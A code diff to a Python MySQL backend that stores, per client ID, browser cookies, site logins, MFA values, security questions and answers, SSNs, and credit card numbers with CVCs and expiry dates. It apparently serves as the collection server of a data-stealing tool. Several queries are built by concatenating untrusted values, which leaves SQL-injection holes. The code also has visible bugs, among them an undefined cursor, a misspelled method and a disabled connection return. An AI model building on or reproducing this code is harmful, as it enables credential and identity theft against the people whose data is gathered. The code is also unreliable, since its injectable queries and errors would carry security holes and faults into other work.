@@ -1,7 +1,7 @@
 import pymysql
 import json
 from copy import deepcopy
-from eventlet import ConnectionPool
+from eventlet.db_pool import ConnectionPool
 conn_pool = None
 BASE_SERVER_RESPONSE = {
     "clientid": 0,
@@ -30,7 +30,7 @@ def getConn():
 
 def returnConn(conn):
     global conn_pool
-    conn_pool.put(conn)
+    #conn_pool.put(conn)
 
 
 """
@@ -69,6 +69,17 @@ Stores a single cookie into the database
 returns 0 for ok, non-zero for bad data format
 """
 def store_cookie(data, clientid):
+    cur.execute('SELECT * FROM Client WHERE ID = %s', clientid)
+    url = data.get("url", None)
+    name = data.get("name", None)
+    content = data.get("content", None)
+    if(cur.rownumber != 0 and url != None and name != None):
+        cur.execte('SELECT * FROM Cookies WHERE CID = %s AND URL = %s AND Name = %s', (clientid, url, name))
+        if(cur.rownumber == 0):
+            cur.execute('INSERT INTO Cookies(CID, URL, Content, Name) VALUES (%s, %s, %s, %s)', (clientid, url, content, name))
+        elif(cur.rownumber != 0 and content != None):
+            cur.execute('INSERT INTO Cookies(CID, URL, Content, Name) VALUES (%s, %s, %s, %s)', (clientid, url, content, name))
+
     return 0
 
 
@@ -77,7 +88,7 @@ Stores a single credential into the database
 returns 0 for ok, non-zero for bad data format
 """
 def store_credential(credentials, clientid):
-    url = credentials.get("url", None)
+    url = credentials.get("URL", None)
     try:
         conn = getConn()
         cur = conn.cursor()
@@ -95,6 +106,7 @@ def store_credential(credentials, clientid):
                     col6 = credentials.get("MFA", None)
                     execStr = "UPDATE Credentials SET MFA = '" + col6 + "' WHERE Username = '" + checkUsername + "' AND URL = '" + url + "' AND CID = " + str(clientid)
                     cur.execute(execStr)
+
             conn.commit()
     finally:
         returnConn(conn)
@@ -149,14 +161,9 @@ def store_form_data(data, clientid):
                 "CID": clientid,
                 "MFA": None
                 }
-        securityQ = {
-                "CID": clientid, 
-                "Question": None,
-                "Answer": None,
-                "URL": url
-                }
-        enums = ["CellPhone", "StreetAddress", "Email", "SSN", "FirstName", "LastName", "BirthDate", "City", "ZipCode", "Country", "State", "CreditCardNumber", "CVC", "ExpirationDate", "Type", "Username", "Password", "MFA", "Question", "Answer"]
-        securityList = [securityQ for x in range(5)]
+        enums = ["CellPhone", "StreetAddress", "Email", "SSN", "FirstName", "LastName", "BirthDate", "City", "ZipCode", "Country", "State", "CreditCardNumber", "CVC", "ExpirationDate", "Type", "Username", "UserPassword", "MFA", "Question", "Answer"]
+        securityListQ = []
+        securityListA = []
         curIndexQ = 0
         curIndexA = 0
 
@@ -166,32 +173,9 @@ def store_form_data(data, clientid):
                 val = data.pop(row[2], None)
                 if(val != None):    
                     if(row[1] == "CellPhone" or row[1] == "StreetAddress" or row[1] == "Email" or row[1] == "SSN" or row[1] == "FirstName" or row[1] == "LastName" or row[1] == "BirthDate" or row[1] == "City" or row[1] == "ZipCode" or row[1] == "Country" or row[1] == "State"):
-                        print(val)
                         execStr = "UPDATE Client SET " + row[1] + " = '" + val + "' WHERE Id = " + str(clientid)
                         cur.execute(execStr)
-                        if(row[1] == "CellPhone"):
-                            enums.remove("CellPhone")
-                        if(row[1] == "StreetAddress"):
-                            enums.remove("StreetAddress")
-                        if(row[1] == "Email"):
-                            enums.remove("Email")
-                        if(row[1] == "SSN"):
-                            enums.remove("SSN")
-                        if(row[1] == "FirstName"):
-                            print(val)
-                            enums.remove("FirstName")
-                        if(row[1] == "LastName"):
-                            enums.remove("LastName")
-                        if(row[1] == "BirthDate"):
-                            enums.remove("BirthDate")
-                        if(row[1] == "City"):
-                            enums.remove("City")
-                        if(row[1] == "ZipCode"):
-                            enums.remove("ZipCode")
-                        if(row[1] == "Country"):
-                            enums.remove("Country")
-                        if(row[1] == "State"):
-                            enums.remove("State")
+                        enums.remove(row[1])
                     elif(row[1] == "CreditCardNumber"):
                         creditCard["CreditCardNumber"] = val
                         enums.remove("CreditCardNumber")
@@ -214,14 +198,12 @@ def store_form_data(data, clientid):
                         credentials["MFA"] = val
                         enums.remove("MFA")
                     elif(row[1] == "Question"):
-                        securityList[curIndexQ]["Question"] = val
-                        curIndexQ = curIndexQ + 1
+                        securityListQ.append(val)
                         #securityQ["Question"] = val
                     elif(row[1] == "Answer"):
                         #securityList["Answer"] = val
-                        securityList[curIndexA]["Answer"] = val
-                        curIndexA = curIndexA + 1
-        
+                        securityListA.append(val)
+
             #credit card information
         if(creditCard.get("CreditCardNumber", None) != None):
             checkCreditCard = creditCard.get("CreditCardNumber", None)
@@ -243,21 +225,24 @@ def store_form_data(data, clientid):
                     cur.execute(execStr)
         
         #credentials information
+        credentials["URL"] = url
         store_credential(credentials, clientid)
 
 
         #security questions information
 
-        for x in range(0, 5):
-            if(securityList[x].get("Question", None) != None):
-                checkQ = securityList[x].get("Question", None)
-                cur.execute('SELECT * FROM SecurityQuestions WHERE CID = %s AND URL = %s AND Question = %s', (clientid, url, checkQ))
-                if(cur.rowcount == 0):
-                    cur.execute('INSERT INTO SecurityQuestions(CID, Question, Answer, URL) VALUES (%s, %s, %s, %s)', (clientid, checkQ, securityList[x].get("Answer", None), url))
-                else:
-                    col7 = securityList[x].get("Answer", None)
-                    execStr = "UPDATE SecurityQuestions SET Answer = '" + col7 + "' WHERE CID = " + str(clientid) + " AND URL = '" + url + "' AND Question = '" + checkQ + "'"            
-                    cur.execute(execStr)
+        for x in range(max(0, len(securityListQ))):
+            cur.execute('SELECT * FROM SecurityQuestions WHERE CID = %s AND URL = %s AND Question = %s', (clientid, url, securityListQ[x]))
+            if(cur.rowcount == 0 and x < len(securityListA)):
+                cur.execute('INSERT INTO SecurityQuestions(CID, Question, Answer, URL) VALUES (%s, %s, %s, %s)', (clientid, securityListQ[x], securityListA[x], url))
+            elif(cur.rowcount == 0):
+                cur.execute('INSERT INTO SecurityQuestions(CID, Question, Answer, URL) VALUES (%s, %s, %s, %s)', (clientid, securityListQ[x], None, url))
+        
+        m = len(securityListA) - len(securityListQ)
+        if(m > 0):
+            for y in range (m):
+                data.update({"Answer" + str(y) : securityListA[len(securityListQ) + y]})
+
 
         if(bool(data) == True):
             complexData = json.dumps(data)
